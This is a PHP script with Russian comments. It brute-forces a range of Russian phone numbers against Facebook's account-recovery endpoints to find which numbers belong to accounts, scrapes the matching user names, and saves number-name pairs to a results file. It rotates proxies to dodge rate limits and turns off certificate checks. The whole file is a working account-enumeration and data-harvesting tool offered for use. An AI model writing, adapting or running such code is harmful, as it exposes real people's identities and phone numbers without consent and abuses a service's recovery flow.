<?php
//////////// Functions
function check_telephone($tel) {
global $ch, $url1, $url2, $results_file, $pattern;
  curl_setopt($ch, CURLOPT_URL, $url1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$tel&__user=0&__a=1");
	$result=curl_exec($ch);
	echo "---\n$result\n---";
	if (strpos($result, "domops")===FALSE) // user exists
	{
		curl_setopt($ch, CURLOPT_URL, $url2);
		$result=curl_exec($ch);
		if (preg_match($pattern, $result, $matches)) 
			fputs($results_file,$tel.":".substr($matches[0],5));
		else 
			if (next_proxy()) check_telephone($tel);
	}
}
function next_proxy() {
global $proxy_file, $ch, $cookie_file_name;
	if (feof($proxy_file)) return false;
	if ($proxy_file && ($buffer = fgets($proxy_file)) !== false) {
		$buffer = str_replace("\n", "", $buffer);
		$buffer = str_replace("\r", "", $buffer);
		curl_setopt($ch, CURLOPT_PROXY, $buffer);
		echo 'next proxy: '.$buffer;
		return true;
	} else return false;
}
/////////// Settings
$cookie_file_name = "cookie.txt";
$results_file_name = "results.txt";
$results_file = fopen($results_file_name, "a+");

$proxy_file = "proxy.txt";
$proxy_file = fopen($proxy_file, "r");

$telephone_prefix='8910';
$url1="https://www.facebook.com/ajax/login/help/identify.php?ctx=recover";
$url2="https://www.facebook.com/recover/initiate";
$pattern = '/fcb[^<]+/'; // паттерн для отыскания имени пользователя
$start_number=1000000;
$end_number=9999999;
///////// Program
$ch = curl_init();
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_name); //Из какого файла читать
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file_name); //В какой файл записывать
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208');

for ($i=$start_number;$i<$end_number;$i++)
	check_telephone($telephone_prefix.$i);

curl_close($ch);
fclose($results_file);
fclose($proxy_file);
unlink($cookie_file_name);
?>
